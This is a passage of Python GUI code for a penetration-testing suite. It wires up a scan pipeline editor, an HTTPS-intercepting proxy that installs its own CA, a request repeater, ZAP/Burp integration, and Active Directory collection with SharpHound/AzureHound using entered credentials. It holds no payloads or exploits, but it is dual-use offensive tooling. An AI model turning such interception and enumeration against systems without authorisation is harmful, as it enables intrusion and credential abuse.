                elif t == 'external_tool':
                    v.addWidget(QLabel('Tool:')); w['tool'] = QtWidgets.QComboBox()
                    for key in TOOL_REGISTRY:
                        w['tool'].addItem(key)
                    if cfg.get('tool') in TOOL_REGISTRY:
                        w['tool'].setCurrentText(cfg['tool'])
                    v.addWidget(w['tool'])
                    v.addWidget(QLabel('Extra args:')); w['extra_args'] = QLineEdit(cfg.get('extra_args', '')); v.addWidget(w['extra_args'])
                elif t == 'report':
                    v.addWidget(QLabel('Format:')); w['format'] = QtWidgets.QComboBox()
                    w['format'].addItems(['html', 'json', 'sarif', 'nuclei', 'pdf'])
                    if cfg.get('format'):
                        w['format'].setCurrentText(cfg['format'])
                    v.addWidget(w['format'])
                    v.addWidget(QLabel('Path (blank=temp):')); w['path'] = QLineEdit(cfg.get('path', '')); v.addWidget(w['path'])
                bb = QHBoxLayout(); ok = QPushButton('OK'); ca = QPushButton('Cancel')
                bb.addStretch(); bb.addWidget(ca); bb.addWidget(ok); v.addLayout(bb)
                res = {'ok': False}
                ca.clicked.connect(d.reject)
                def acc():
                    new = {}
                    if t == 'wafpierce_scan':
                        cats = [x.strip() for x in w['categories'].text().split(',') if x.strip()]
                        if cats:
                            new['categories'] = cats
                        try:
                            new['threads'] = int(w['threads'].text())
                        except Exception:
                            pass
                    elif t == 'external_tool':
                        new['tool'] = w['tool'].currentText()
                        if w['extra_args'].text().strip():
                            new['extra_args'] = w['extra_args'].text().strip()
                    elif t == 'report':
                        new['format'] = w['format'].currentText()
                        if w['path'].text().strip():
                            new['path'] = w['path'].text().strip()
                    s['config'] = new; res['ok'] = True; d.accept()
                ok.clicked.connect(acc)
                d.exec()
                return res['ok']

            def add_stage():
                t = type_combo.currentData()
                s = {'id': f'stage{len(state["stages"]) + 1}', 'type': t, 'config': {}}
                if edit_stage(s):
                    state['stages'].append(s); refresh_list()

            def edit_selected():
                i = stage_list.currentRow()
                if i >= 0 and edit_stage(state['stages'][i]):
                    refresh_list()

            def remove_selected():
                i = stage_list.currentRow()
                if i >= 0:
                    state['stages'].pop(i); refresh_list()

            def move(delta):
                i = stage_list.currentRow(); j = i + delta
                if i < 0 or j < 0 or j >= len(state['stages']):
                    return
                state['stages'][i], state['stages'][j] = state['stages'][j], state['stages'][i]
                refresh_list(); stage_list.setCurrentRow(j)

            def reload_saved():
                load_combo.clear()
                if self._db:
                    for p in self._db.list_pipelines():
                        load_combo.addItem(p['name'])

            def do_load():
                if not self._db:
                    return
                nm = load_combo.currentText()
                rec = self._db.get_pipeline(nm) if nm else None
                if rec:
                    state['stages'] = rec['definition'].get('stages', [])
                    name_edit.setText(nm); refresh_list()

            def do_save():
                nm = name_edit.text().strip()
                if not nm:
                    QMessageBox.information(dlg, 'Pipeline', 'Enter a name.'); return
                pdef = {'name': nm, 'schema_version': 1, 'stages': state['stages']}
                errs = validate_pipeline(pdef)
                if errs:
                    QMessageBox.warning(dlg, 'Pipeline', 'Invalid:\n' + '\n'.join(errs)); return
                if self._db and self._db.save_pipeline(nm, pdef):
                    log.append(f'[+] Saved pipeline "{nm}"'); reload_saved()

            def do_delete():
                nm = load_combo.currentText()
                if self._db and nm and self._db.delete_pipeline(nm):
                    log.append(f'[+] Deleted "{nm}"'); reload_saved()

            def run_pipeline():
                tgt = target_edit.text().strip()
                if not tgt:
                    QMessageBox.information(dlg, 'Pipeline', 'Enter a target.'); return
                pdef = {'name': name_edit.text().strip() or 'pipeline', 'schema_version': 1, 'stages': state['stages']}
                errs = validate_pipeline(pdef)
                if errs:
                    QMessageBox.warning(dlg, 'Pipeline', 'Invalid:\n' + '\n'.join(errs)); return
                self._pipe_thread = QtCore.QThread()
                self._pipe_worker = PipelineWorker(pdef, tgt)
                self._pipe_worker.moveToThread(self._pipe_thread)
                self._pipe_thread.started.connect(self._pipe_worker.run)
                self._pipe_worker.log_line.connect(lambda m: log.append(str(m).rstrip()))
                self._pipe_worker.findings.connect(
                    lambda items: self._ingest_external_findings(items, label=f'pipeline @ {tgt}'))

                def fin():
                    run_btn.setEnabled(True); stop_btn.setEnabled(False)
                    log.append('[+] Pipeline finished. Open Results to view.')
                    try:
                        self._pipe_thread.quit(); self._pipe_thread.wait(3000)
                    except Exception:
                        pass

                self._pipe_worker.finished.connect(fin)
                run_btn.setEnabled(False); stop_btn.setEnabled(True)
                log.append(f'[*] Running pipeline against {tgt} …')
                self._pipe_thread.start()

            def stop_pipeline():
                try:
                    if getattr(self, '_pipe_worker', None):
                        self._pipe_worker.abort(); log.append('[!] Stop requested (tree-kill).')
                except Exception:
                    pass

            add_btn.clicked.connect(add_stage)
            edit_btn.clicked.connect(edit_selected)
            up_btn.clicked.connect(lambda: move(-1))
            down_btn.clicked.connect(lambda: move(1))
            rm_btn.clicked.connect(remove_selected)
            stage_list.itemDoubleClicked.connect(lambda *_: edit_selected())
            load_btn.clicked.connect(do_load)
            save_btn.clicked.connect(do_save)
            del_btn.clicked.connect(do_delete)
            run_btn.clicked.connect(run_pipeline)
            stop_btn.clicked.connect(stop_pipeline)
            results_btn.clicked.connect(self.show_results_summary)

            state['stages'] = list(default_pipeline()['stages'])
            refresh_list(); reload_saved()
            dlg.exec()

        def _persist_proxy_flow(self, flow):
            """GUI-thread slot: persist a captured proxy flow to the unified store."""
            try:
                if self._db:
                    self._db.add_captured_request(flow)
            except Exception:
                pass

        def _start_proxy(self, host, port):
            """Start the built-in intercepting proxy (idempotent). Returns (ok, msg)."""
            try:
                if getattr(self, '_proxy_engine', None) and getattr(self._proxy_engine, 'server', None):
                    return True, f'already running on {self._proxy_engine.host}:{self._proxy_engine.port}'
                from .proxy import build_proxy_engine
                from .config import get_proxy_ca_dir
                if not getattr(self, '_proxy_signals', None):
                    self._proxy_signals = ProxySignals()
                    self._proxy_signals.flow_captured.connect(self._persist_proxy_flow)
                eng = build_proxy_engine(
                    get_proxy_ca_dir(),
                    on_flow=lambda f: self._proxy_signals.flow_captured.emit(f))
                if not eng.available:
                    return False, getattr(eng, 'reason', 'proxy unavailable')
                h, p = eng.start(host, int(port))
                self._proxy_engine = eng
                return True, f'listening on {h}:{p}'
            except OSError as e:
                return False, f'bind failed ({e})'
            except Exception as e:
                return False, str(e)

        def _stop_proxy(self):
            try:
                if getattr(self, '_proxy_engine', None):
                    self._proxy_engine.stop()
                    self._proxy_engine = None
                    return True
            except Exception:
                pass
            return False

        def _build_proxy_page(self):
            """Built-in intercepting proxy + Burp/ZAP-style Repeater. Records HTTP(S)
            traffic to the unified history store; HTTPS needs the Blackthorn CA trusted."""
            from .config import get_proxy_ca_dir
            dlg = QtWidgets.QWidget()
            dlg.setWindowTitle('Proxy + Repeater')
            dlg.resize(1040, 720)
            dlg.setStyleSheet('''
                QDialog { background-color: #0f1112; }
                QLabel { color: #d7e1ea; }
                QLineEdit, QComboBox, QPlainTextEdit { background-color: #16181a; color: #d7e1ea; border: 1px solid #2b2f33; border-radius: 4px; padding: 5px; }
                QTreeWidget { background-color: #16181a; color: #d7e1ea; border: 1px solid #2b2f33; }
                QTreeWidget::item:selected { background-color: #3b82f6; }
                QTabWidget::pane { border: 1px solid #2b2f33; }
                QTabBar::tab { background:#16181a; color:#d7e1ea; padding:7px 14px; }
                QTabBar::tab:selected { background:#2b2f33; }
                QPushButton { background-color: #2b2f33; color: #d7e1ea; border: none; padding: 7px 12px; border-radius: 4px; }
                QPushButton:hover { background-color: #3b3f43; }
                QPushButton:disabled { color: #6b737b; }
                QTextEdit { background:#0b0d0e; color:#d7e1ea; border:1px solid #2b2f33; }
            ''')
            outer = QVBoxLayout(dlg)
            tabs = QtWidgets.QTabWidget()
            outer.addWidget(tabs, 1)

            # ---------------- Proxy tab ----------------
            ptab = QWidget(); pv = QVBoxLayout(ptab)
            ctl = QHBoxLayout()
            host_edit = QLineEdit(str(self._prefs.get('proxy_listen_host', '127.0.0.1')))
            host_edit.setFixedWidth(120)
            port_edit = QLineEdit(str(self._prefs.get('proxy_listen_port', 8081)))
            port_edit.setFixedWidth(70)
            start_btn = QPushButton('Start'); stop_btn = QPushButton('Stop')
            status_lbl = QLabel('stopped'); status_lbl.setStyleSheet('color:#8b949e;')
            running = bool(getattr(self, '_proxy_engine', None) and getattr(self._proxy_engine, 'server', None))
            if running:
                status_lbl.setText(f'listening on {self._proxy_engine.host}:{self._proxy_engine.port}')
                status_lbl.setStyleSheet('color:#3fb950;')
            ctl.addWidget(QLabel('Host:')); ctl.addWidget(host_edit)
            ctl.addWidget(QLabel('Port:')); ctl.addWidget(port_edit)
            ctl.addWidget(start_btn); ctl.addWidget(stop_btn); ctl.addWidget(status_lbl); ctl.addStretch()
            pv.addLayout(ctl)

            caline = QHBoxLayout()
            ca_export = QPushButton('Export CA cert')
            ca_install = QPushButton('Install CA (current user)')
            ca_remove = QPushButton('Remove CA')
            caline.addWidget(QLabel('HTTPS needs the Blackthorn CA trusted:'))
            caline.addWidget(ca_export); caline.addWidget(ca_install); caline.addWidget(ca_remove); caline.addStretch()
            pv.addLayout(caline)

            hist = QTreeWidget(); hist.setColumnCount(6)
            hist.setHeaderLabels(['#', 'Method', 'Host', 'Path', 'Status', 'Len'])
            try:
                hist.header().setSectionResizeMode(3, QHeaderView.Stretch)
            except Exception:
                pass
            pv.addWidget(hist, 1)
            hrow = QHBoxLayout()
            refresh_btn = QPushButton('Refresh'); clear_btn = QPushButton('Clear')
            to_rep_btn = QPushButton('→ Repeater'); to_scan_btn = QPushButton('→ Scanner')
            hrow.addWidget(refresh_btn); hrow.addWidget(clear_btn); hrow.addStretch()
            hrow.addWidget(to_rep_btn); hrow.addWidget(to_scan_btn)
            pv.addLayout(hrow)
            tabs.addTab(ptab, 'Proxy')

            # ---------------- Repeater tab ----------------
            rtab = QWidget(); rv = QVBoxLayout(rtab)
            rtop = QHBoxLayout()
            method_combo = QtWidgets.QComboBox(); method_combo.addItems(['GET', 'POST', 'PUT', 'DELETE', 'HEAD', 'PATCH', 'OPTIONS'])
            url_edit = QLineEdit(); url_edit.setPlaceholderText('https://target/path')
            send_btn = QPushButton('Send')
            rtop.addWidget(method_combo); rtop.addWidget(url_edit, 1); rtop.addWidget(send_btn)
            rv.addLayout(rtop)
            rv.addWidget(QLabel('Request headers (one per line: Name: value):'))
            headers_edit = QtWidgets.QPlainTextEdit(); headers_edit.setMaximumHeight(110)
            rv.addWidget(headers_edit)
            rv.addWidget(QLabel('Request body:'))
            body_edit = QtWidgets.QPlainTextEdit(); body_edit.setMaximumHeight(90)
            rv.addWidget(body_edit)
            resp_lbl = QLabel('Response:'); rv.addWidget(resp_lbl)
            resp_view = QTextEdit(); resp_view.setReadOnly(True)
            rv.addWidget(resp_view, 1)
            tabs.addTab(rtab, 'Repeater')

            # ---------------- behavior ----------------
            def set_running(on, msg=''):
                start_btn.setEnabled(not on); stop_btn.setEnabled(on)
                status_lbl.setText(msg or ('running' if on else 'stopped'))
                status_lbl.setStyleSheet('color:#3fb950;' if on else 'color:#8b949e;')
            set_running(running, status_lbl.text())

            def do_start():
                ok, msg = self._start_proxy(host_edit.text().strip() or '127.0.0.1',
                                            port_edit.text().strip() or '8081')
                set_running(ok, msg)
                if ok:
                    try:
                        self._prefs['proxy_listen_host'] = host_edit.text().strip()
                        self._prefs['proxy_listen_port'] = int(port_edit.text().strip())
                    except Exception:
                        pass

            def do_stop():
                self._stop_proxy(); set_running(False, 'stopped')

            def export_ca():
                p, _ = QFileDialog.getSaveFileName(dlg, 'Export CA cert', 'blackthorn_ca.pem', 'PEM (*.pem)')
                if p:
                    try:
                        from .proxy_ca import CertAuthority
                        ca = CertAuthority(get_proxy_ca_dir())
                        with open(p, 'wb') as f:
                            f.write(ca.ca_cert_pem)
                        QMessageBox.information(dlg, 'CA', f'Exported to {p}')
                    except Exception as e:
                        QMessageBox.critical(dlg, 'CA', str(e))

            def run_certutil(add):
                try:
                    from .proxy_ca import CertAuthority
                    ca = CertAuthority(get_proxy_ca_dir())
                    cmd = ca.certutil_add_cmd() if add else ca.certutil_del_cmd()
                    import shutil as _sh
                    if not _sh.which('certutil'):
                        QMessageBox.information(dlg, 'CA', 'certutil not found. Manually import:\n'
                                                + ca.ca_cert_path)
                        return
                    r = subprocess.run(cmd, capture_output=True, text=True)
                    QMessageBox.information(dlg, 'CA', (r.stdout or '') + (r.stderr or '')
                                            or ('installed' if add else 'removed'))
                except Exception as e:
                    QMessageBox.critical(dlg, 'CA', str(e))

            def reload_history():
                hist.clear()
                if not self._db:
                    return
                for r in self._db.get_captured_requests(limit=500):
                    item = QTreeWidgetItem([str(r.get('id', '')), r.get('method', ''),
                                            r.get('host', ''), r.get('path', ''),
                                            str(r.get('status_code', '')),
                                            str(len(r.get('resp_body') or b''))])
                    item.setData(0, 256, r)
                    hist.addTopLevelItem(item)

            def on_live_flow(_flow):
                # a flow was captured+persisted; refresh the visible list
                reload_history()

            def selected_flow():
                it = hist.currentItem()
                return it.data(0, 256) if it else None

            def send_to_repeater(flow=None):
                flow = flow or selected_flow()
                if not flow:
                    return
                method_combo.setCurrentText(flow.get('method', 'GET'))
                url_edit.setText(flow.get('url', ''))
                try:
                    import json as _json
                    h = flow.get('req_headers')
                    h = _json.loads(h) if isinstance(h, str) else (h or {})
                    headers_edit.setPlainText('\n'.join(f'{k}: {v}' for k, v in h.items()))
                except Exception:
                    pass
                rb = flow.get('req_body')
                if rb:
                    try:
                        body_edit.setPlainText(rb.decode('utf-8', 'replace') if isinstance(rb, (bytes, bytearray)) else str(rb))
                    except Exception:
                        pass
                tabs.setCurrentWidget(rtab)

            def send_to_scanner():
                flow = selected_flow()
                if flow and flow.get('url'):
                    try:
                        self.target_edit.setText(flow['url']); self.add_target()
                        QMessageBox.information(dlg, 'Scanner', f"Queued {flow['url']}")
                    except Exception:
                        pass

            def parse_headers():
                out = {}
                for ln in headers_edit.toPlainText().splitlines():
                    if ':' in ln:
                        k, _, v = ln.partition(':')
                        out[k.strip()] = v.strip()
                return out

            def show_response(res):
                if not res.get('ok'):
                    resp_view.setPlainText(f"[error] {res.get('error')}")
                    return
                hdrs = '\n'.join(f'{k}: {v}' for k, v in res.get('headers', {}).items())
                body = res.get('body') or b''
                try:
                    body = body.decode('utf-8', 'replace') if isinstance(body, (bytes, bytearray)) else str(body)
                except Exception:
                    body = str(body)
                resp_lbl.setText(f"Response: {res.get('status')} {res.get('reason','')}  ({res.get('elapsed_ms',0):.0f} ms)")
                resp_view.setPlainText(hdrs + '\n\n' + body[:200000])
                send_btn.setEnabled(True)

            if not getattr(self, '_proxy_signals', None):
                self._proxy_signals = ProxySignals()
                self._proxy_signals.flow_captured.connect(self._persist_proxy_flow)
            self._proxy_signals.flow_captured.connect(on_live_flow)
            self._proxy_signals.result_ready.connect(show_response)

            def do_send():
                import threading as _th
                url = url_edit.text().strip()
                if not url:
                    return
                send_btn.setEnabled(False)
                resp_lbl.setText('Response: sending …')
                method = method_combo.currentText()
                headers = parse_headers()
                body = body_edit.toPlainText()
                sig = self._proxy_signals
                def worker():
                    from .proxy import replay
                    res = replay(method, url, headers, body or None)
                    sig.result_ready.emit(res)
                _th.Thread(target=worker, daemon=True).start()

            start_btn.clicked.connect(do_start)
            stop_btn.clicked.connect(do_stop)
            ca_export.clicked.connect(export_ca)
            ca_install.clicked.connect(lambda: run_certutil(True))
            ca_remove.clicked.connect(lambda: run_certutil(False))
            refresh_btn.clicked.connect(reload_history)
            clear_btn.clicked.connect(lambda: (self._db and self._db.clear_captured_requests(), reload_history()))
            to_rep_btn.clicked.connect(lambda: send_to_repeater())
            to_scan_btn.clicked.connect(send_to_scanner)
            hist.itemDoubleClicked.connect(lambda *_: send_to_repeater())
            send_btn.clicked.connect(do_send)

            reload_history()
            def on_close(ev):
                try:
                    self._proxy_signals.flow_captured.disconnect(on_live_flow)
                    self._proxy_signals.result_ready.disconnect(show_response)
                except Exception:
                    pass
                ev.accept()
            dlg.closeEvent = on_close
            return dlg

        def _show_browser(self):
            """Embedded QtWebEngine browser (source-only). Records request metadata
            into the unified history store. Degrades to an install hint if the
            QtWebEngine add-on is absent — the rest of the app stays usable."""
            try:
                from .browser_view import webengine_available, create_embedded_browser
            except Exception as e:
                QMessageBox.information(self, 'Browser', f'Browser module unavailable: {e}')
                return
            ok, err = webengine_available()
            if not ok:
                QMessageBox.information(
                    self, 'Browser',
                    'The embedded browser needs QtWebEngine.\n\n'
                    'Install it with:\n    pip install PySide6-Addons\n\n'
                    f'Details: {err}')
                return
            if not getattr(self, '_proxy_signals', None):
                self._proxy_signals = ProxySignals()
                self._proxy_signals.flow_captured.connect(self._persist_proxy_flow)
            try:
                browser = create_embedded_browser(
                    on_request_meta=lambda meta: self._proxy_signals.flow_captured.emit(meta))
            except Exception as e:
                QMessageBox.critical(self, 'Browser', f'Failed to start browser: {e}')
                return
            dlg = QtWidgets.QDialog(self)
            dlg.setWindowTitle('Browser')
            dlg.resize(1120, 780)
            dlg.setStyleSheet('QDialog { background-color: #0f1112; } QLabel { color:#d7e1ea; } '
                              'QLineEdit { background:#16181a; color:#d7e1ea; border:1px solid #2b2f33; border-radius:4px; padding:5px; } '
                              'QPushButton { background:#2b2f33; color:#d7e1ea; border:none; padding:6px 10px; border-radius:4px; } '
                              'QPushButton:hover { background:#3b3f43; }')
            v = QVBoxLayout(dlg)
            v.addWidget(browser, 1)
            try:
                t = (self.target_edit.text() or '').strip()
                start_url = t or self._prefs.get('browser_last_url', '')
                if start_url:
                    browser.load(start_url)
            except Exception:
                pass
            def on_close(ev):
                try:
                    self._prefs['browser_last_url'] = browser.url.text().strip()
                except Exception:
                    pass
                ev.accept()
            dlg.closeEvent = on_close
            dlg.exec()

        def _build_zapburp_page(self):
            """Detect-&-drive OWASP ZAP (REST spider+active-scan) and import Burp
            Suite issue reports. Findings flow into the Results Explorer tagged
            [ZAP]/[Burp]. Absent tools degrade to a status line, never a crash."""
            from .tooldrivers import detect_zap, detect_burp
            dlg = QtWidgets.QWidget()
            dlg.setWindowTitle('ZAP / Burp')
            dlg.resize(860, 620)
            dlg.setStyleSheet('''
                QDialog { background-color: #0f1112; }
                QLabel { color: #d7e1ea; }
                QGroupBox { color:#d7e1ea; border:1px solid #2b2f33; margin-top:10px; padding-top:10px; }
                QGroupBox::title { subcontrol-origin: margin; left:10px; padding:0 5px; }
                QLineEdit, QComboBox { background:#16181a; color:#d7e1ea; border:1px solid #2b2f33; border-radius:4px; padding:5px; }
                QCheckBox { color:#d7e1ea; }
                QPushButton { background:#2b2f33; color:#d7e1ea; border:none; padding:7px 12px; border-radius:4px; }
                QPushButton:hover { background:#3b3f43; }
                QPushButton:disabled { color:#6b737b; }
                QTextEdit { background:#0b0d0e; color:#9ee6a0; border:1px solid #2b2f33; }
            ''')
            outer = QVBoxLayout(dlg)

            zg = QtWidgets.QGroupBox('OWASP ZAP (REST API)'); zl = QVBoxLayout(zg)
            zrow = QHBoxLayout()
            host = QLineEdit(str(self._prefs.get('zap_host', '127.0.0.1'))); host.setFixedWidth(120)
            port = QLineEdit(str(self._prefs.get('zap_port', 8080))); port.setFixedWidth(64)
            apikey = QLineEdit(self._prefs.get('zap_apikey', '')); apikey.setPlaceholderText('apikey (optional)')
            detect_btn = QPushButton('Detect'); zstatus = QLabel('unknown'); zstatus.setStyleSheet('color:#8b949e;')
            zrow.addWidget(QLabel('Host:')); zrow.addWidget(host); zrow.addWidget(QLabel('Port:')); zrow.addWidget(port)
            zrow.addWidget(QLabel('Key:')); zrow.addWidget(apikey, 1); zrow.addWidget(detect_btn); zrow.addWidget(zstatus)
            zl.addLayout(zrow)
            zrow2 = QHBoxLayout()
            tgt = QLineEdit()
            try:
                tgt.setText(self.target_edit.text().strip())
            except Exception:
                pass
            tgt.setPlaceholderText('target URL')
            spider_chk = QCheckBox('Spider'); spider_chk.setChecked(True)
            ascan_chk = QCheckBox('Active scan'); ascan_chk.setChecked(True)
            run_btn = QPushButton('Run'); stop_btn = QPushButton('Stop'); stop_btn.setEnabled(False)
            zrow2.addWidget(QLabel('Target:')); zrow2.addWidget(tgt, 1)
            zrow2.addWidget(spider_chk); zrow2.addWidget(ascan_chk); zrow2.addWidget(run_btn); zrow2.addWidget(stop_btn)
            zl.addLayout(zrow2)
            outer.addWidget(zg)

            bg = QtWidgets.QGroupBox('Burp Suite (import issues report)'); bl = QVBoxLayout(bg)
            brow = QHBoxLayout(); bdetect = QPushButton('Detect'); bstatus = QLabel('unknown'); bstatus.setStyleSheet('color:#8b949e;')
            bimport = QPushButton('Import Burp issues (XML/JSON)')
            brow.addWidget(bdetect); brow.addWidget(bstatus); brow.addStretch(); brow.addWidget(bimport)
            bl.addLayout(brow)
            outer.addWidget(bg)

            log = QTextEdit(); log.setReadOnly(True); log.setMaximumHeight(240)
            log.setStyleSheet('font-family: Consolas, monospace; font-size: 11px;')
            outer.addWidget(log, 1)
            res_btn = QPushButton('◆ Open Results'); outer.addWidget(res_btn)

            def append(m):
                log.append(str(m).rstrip())

            def do_detect_zap():
                st = detect_zap(host.text().strip() or '127.0.0.1', int(port.text() or 8080), apikey.text().strip())
                if st['state'] == 'running':
                    zstatus.setText(f"running v{st['version']}"); zstatus.setStyleSheet('color:#3fb950;')
                else:
                    zstatus.setText('absent'); zstatus.setStyleSheet('color:#8b949e;')
                    append(f"[!] ZAP not reachable: {st['error']}")

            def do_detect_burp():
                st = detect_burp()
                if st['state'] == 'installed':
                    bstatus.setText('installed'); bstatus.setStyleSheet('color:#3fb950;'); append(f"[*] Burp: {st['path']}")
                else:
                    bstatus.setText('absent'); bstatus.setStyleSheet('color:#8b949e;')

            def run_zap():
                t = tgt.text().strip()
                if not t:
                    QMessageBox.information(dlg, 'ZAP', 'Enter a target.'); return
                self._prefs['zap_host'] = host.text().strip()
                try:
                    self._prefs['zap_port'] = int(port.text() or 8080)
                except Exception:
                    pass
                self._prefs['zap_apikey'] = apikey.text().strip()
                self._zap_thread = QtCore.QThread()
                self._zap_worker = ZapWorker(host.text().strip(), port.text().strip(),
                                             apikey.text().strip(), t,
                                             spider_chk.isChecked(), ascan_chk.isChecked())
                self._zap_worker.moveToThread(self._zap_thread)
                self._zap_thread.started.connect(self._zap_worker.run)
                self._zap_worker.log_line.connect(append)

                def done(items):
                    n = self._ingest_external_findings(items, label=f'ZAP @ {t}')
                    append(f'[+] Ingested {n} ZAP finding(s).')
                    run_btn.setEnabled(True); stop_btn.setEnabled(False)
                    try:
                        self._zap_thread.quit(); self._zap_thread.wait(3000)
                    except Exception:
                        pass

                self._zap_worker.findings.connect(done)
                run_btn.setEnabled(False); stop_btn.setEnabled(True)
                append(f'[*] ZAP scanning {t} …')
                self._zap_thread.start()

            def stop_zap():
                if getattr(self, '_zap_worker', None):
                    self._zap_worker.abort(); append('[!] ZAP stop requested.')

            def import_burp():
                p, _ = QFileDialog.getOpenFileName(dlg, 'Import Burp issues', filter='Burp issues (*.xml *.json)')
                if not p:
                    return
                try:
                    from .importers import load_findings
                    items = load_findings(p)
                    n = self._ingest_external_findings(items, label='Burp import')
                    append(f'[+] Imported {n} Burp finding(s) from {p}')
                except Exception as e:
                    QMessageBox.critical(dlg, 'Burp', str(e))

            detect_btn.clicked.connect(do_detect_zap)
            bdetect.clicked.connect(do_detect_burp)
            run_btn.clicked.connect(run_zap)
            stop_btn.clicked.connect(stop_zap)
            bimport.clicked.connect(import_burp)
            res_btn.clicked.connect(self.show_results_summary)
            do_detect_zap(); do_detect_burp()
            return dlg

        def _build_adint_page(self):
            """Active Directory / internal section: detect-&-drive BloodHound + Neo4j +
            SharpHound/AzureHound. Optional and clearly separated from web scanning.
            Credentials are kept in-memory (not persisted). Authorized use only."""
            try:
                from . import adint
            except Exception as e:
                QMessageBox.critical(self, 'AD / Internal', f'AD module unavailable: {e}')
                return
            P = self._prefs
            dlg = QtWidgets.QWidget()
            dlg.setWindowTitle('AD / Internal — BloodHound + Neo4j')
            dlg.resize(940, 720)
            dlg.setStyleSheet('''
                QDialog { background-color: #0f1112; }
                QLabel { color:#d7e1ea; }
                QLineEdit, QComboBox, QPlainTextEdit { background:#16181a; color:#d7e1ea; border:1px solid #2b2f33; border-radius:4px; padding:5px; }
                QTreeWidget { background:#16181a; color:#d7e1ea; border:1px solid #2b2f33; }
                QTabWidget::pane { border:1px solid #2b2f33; }
                QTabBar::tab { background:#16181a; color:#d7e1ea; padding:7px 14px; }
                QTabBar::tab:selected { background:#2b2f33; }
                QPushButton { background:#2b2f33; color:#d7e1ea; border:none; padding:7px 12px; border-radius:4px; }
                QPushButton:hover { background:#3b3f43; }
                QTextEdit { background:#0b0d0e; color:#9ee6a0; border:1px solid #2b2f33; }
            ''')
            outer = QVBoxLayout(dlg)
            warn = QLabel('⚠ Internal Active Directory assessment — authorized engagements only. '
                          'Credentials entered here are kept in memory and not saved.')
            warn.setWordWrap(True); warn.setStyleSheet('color:#d29922;')
            outer.addWidget(warn)
            tabs = QtWidgets.QTabWidget(); outer.addWidget(tabs, 1)

            # shared config fields
            neo_host = QLineEdit(str(P.get('adint_neo4j_host', '127.0.0.1')))
            neo_port = QLineEdit(str(P.get('adint_neo4j_port', 7687)))
            neo_user = QLineEdit(str(P.get('adint_neo4j_user', 'neo4j')))
            neo_pass = QLineEdit(); neo_pass.setEchoMode(QLineEdit.Password)
            bhce_url = QLineEdit(str(P.get('adint_bhce_url', 'http://127.0.0.1:8080')))
            sh_path = QLineEdit(str(P.get('adint_sharphound', '')))
            ah_path = QLineEdit(str(P.get('adint_azurehound', '')))

            # ---- Status tab ----
            stab = QWidget(); sv = QVBoxLayout(stab)
            grid = QtWidgets.QGridLayout()
            grid.addWidget(QLabel('Neo4j host:'), 0, 0); grid.addWidget(neo_host, 0, 1)
            grid.addWidget(QLabel('port:'), 0, 2); grid.addWidget(neo_port, 0, 3)
            grid.addWidget(QLabel('BloodHound CE URL:'), 1, 0); grid.addWidget(bhce_url, 1, 1, 1, 3)
            grid.addWidget(QLabel('SharpHound path:'), 2, 0); grid.addWidget(sh_path, 2, 1, 1, 3)
            grid.addWidget(QLabel('AzureHound path:'), 3, 0); grid.addWidget(ah_path, 3, 1, 1, 3)
            sv.addLayout(grid)
            status_tree = QTreeWidget(); status_tree.setColumnCount(3)
            status_tree.setHeaderLabels(['Component', 'State', 'Detail'])
            sv.addWidget(status_tree, 1)
            detect_btn = QPushButton('Detect / Re-detect'); sv.addWidget(detect_btn)
            tabs.addTab(stab, 'Status')

            def save_cfg():
                P['adint_neo4j_host'] = neo_host.text().strip()
                try:
                    P['adint_neo4j_port'] = int(neo_port.text() or 7687)
                except Exception:
                    pass
                P['adint_neo4j_user'] = neo_user.text().strip()
                P['adint_bhce_url'] = bhce_url.text().strip()
                P['adint_sharphound'] = sh_path.text().strip()
                P['adint_azurehound'] = ah_path.text().strip()

            def do_detect():
                save_cfg()
                env = adint.detect_environment(
                    neo_host.text().strip() or '127.0.0.1', int(neo_port.text() or 7687),
                    bhce_url.text().strip(), sh_path.text().strip(), ah_path.text().strip())
                status_tree.clear()
                colors = {'running': '#3fb950', 'installed': '#3fb950',
                          'absent': '#8b949e', 'unknown': '#d29922'}
                for comp, info in env.items():
                    it = QTreeWidgetItem([comp, info['state'], str(info.get('detail', ''))])
                    try:
                        it.setForeground(1, QBrush(QColor(colors.get(info['state'], '#8b949e'))))
                    except Exception:
                        pass
                    status_tree.addTopLevelItem(it)
            detect_btn.clicked.connect(do_detect)

            # ---- Collect tab ----
            ctab = QWidget(); cv = QVBoxLayout(ctab)
            crow = QHBoxLayout()
            collector_combo = QtWidgets.QComboBox(); collector_combo.addItems(['sharphound', 'azurehound'])
            domain_edit = QLineEdit(); domain_edit.setPlaceholderText('domain / tenant')
            cuser = QLineEdit(); cuser.setPlaceholderText('username')
            cpass = QLineEdit(); cpass.setEchoMode(QLineEdit.Password); cpass.setPlaceholderText('password / JWT')
            crow.addWidget(QLabel('Collector:')); crow.addWidget(collector_combo)
            crow.addWidget(QLabel('Domain/Tenant:')); crow.addWidget(domain_edit, 1)
            cv.addLayout(crow)
            crow2 = QHBoxLayout()
            crow2.addWidget(QLabel('User:')); crow2.addWidget(cuser); crow2.addWidget(QLabel('Pass/JWT:')); crow2.addWidget(cpass)
            outdir_edit = QLineEdit(str(P.get('adint_output_dir', '')))
            outdir_btn = QPushButton('…'); outdir_btn.setFixedWidth(32)
            crow2.addWidget(QLabel('Out dir:')); crow2.addWidget(outdir_edit, 1); crow2.addWidget(outdir_btn)
            cv.addLayout(crow2)
            crow3 = QHBoxLayout()
            collect_btn = QPushButton('Collect'); cstop_btn = QPushButton('Stop'); cstop_btn.setEnabled(False)
            crow3.addWidget(collect_btn); crow3.addWidget(cstop_btn); crow3.addStretch()
            cv.addLayout(crow3)
            clog = QTextEdit(); clog.setReadOnly(True); clog.setStyleSheet('font-family:Consolas,monospace;font-size:11px;')
            cv.addWidget(clog, 1)
            tabs.addTab(ctab, 'Collect')

            def pick_outdir():
                d = QFileDialog.getExistingDirectory(dlg, 'Output directory')
                if d:
                    outdir_edit.setText(d)
            outdir_btn.clicked.connect(pick_outdir)

            def do_collect():
                import uuid as _uuid
                collector = collector_combo.currentText()
                cpath = sh_path.text().strip() if collector == 'sharphound' else ah_path.text().strip()
                outdir = outdir_edit.text().strip() or os.path.join(tempfile.gettempdir(), 'blackthorn_ad')
                os.makedirs(outdir, exist_ok=True)
                P['adint_output_dir'] = outdir
                try:
                    argv = adint.build_collector_cmd(
                        collector, collector_path=cpath, output_dir=outdir,
                        domain=domain_edit.text().strip(), username=cuser.text().strip(),
                        password=cpass.text(), tenant=domain_edit.text().strip(), jwt='')
                except Exception as e:
                    QMessageBox.warning(dlg, 'Collect', str(e)); return
                run_id = str(_uuid.uuid4())
                if self._db:
                    self._db.save_ad_run(run_id, collector, domain_edit.text().strip(), outdir)
